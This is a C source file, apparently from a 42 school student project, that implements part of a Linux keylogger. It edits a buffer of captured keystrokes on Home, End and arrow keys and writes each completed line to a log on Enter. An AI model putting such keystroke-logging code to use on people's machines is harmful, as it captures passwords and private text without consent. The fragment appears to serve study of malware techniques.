/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylog_actions.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 19:28:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <linux/input.h>

int			keylog_home(t_keylog_buf *kl_buf, t_ull code)
{
	if (code == KEY_HOME)
		kl_buf->index = 0;
	else if (code == KEY_END)
		kl_buf->index = kl_buf->len;
	return (1);
}

static int	get_dir_value(t_keylog_buf *kl_buf, int dir)
{
	if ((int)kl_buf->index + dir >= 0 && (int)kl_buf->index + dir <= (int)kl_buf->len)
		return (kl_buf->index + dir);
	return (kl_buf->index);
}

int			keylog_keys(t_keylog_buf *kl_buf, t_ull code)
{
	int		i;
	int		dir;
	char	beg;
	char	end;
	int		last_idx;

	dir = code == KEY_LEFT ? -1 : 1;
	beg = dir == 1 ? '<' : '>';
	end = dir == 1 ? '>' : '<';
	i = get_dir_value(kl_buf, dir);
	while (i >= 0 && i <= (int)kl_buf->len &&
		kl_buf->buf[i] && kl_buf->buf[i] == beg)
	{
		last_idx = i;
		i += dir;
		while (i > 0 && i < (int)kl_buf->len && kl_buf->buf[i] &&
			kl_buf->buf[i] != end && kl_buf->buf[i] != beg)
			i += dir;
		if (kl_buf->buf[i] && kl_buf->buf[i] != end)
		{
			i = last_idx;
			break ;
		}
		else if (i + dir >= 0 && i + dir <= (int)kl_buf->len)
			i += dir;
	}
	kl_buf->index = i;
	return (1);
}

int			keylog_enter(t_keylog_buf *kl_buf, t_ull code)
{
	size_t	b_size;

	(void)code;
	if (kl_buf->len > 0)
		ft_putendl_fd(kl_buf->buf, kl_buf->log);
	b_size = kl_buf->len + 10 > BUFF_SIZE ? BUFF_SIZE : kl_buf->len + 10;
	ft_bzero(kl_buf->buf, b_size);
	kl_buf->index = 0;
	kl_buf->len = 0;
	return (1);
}
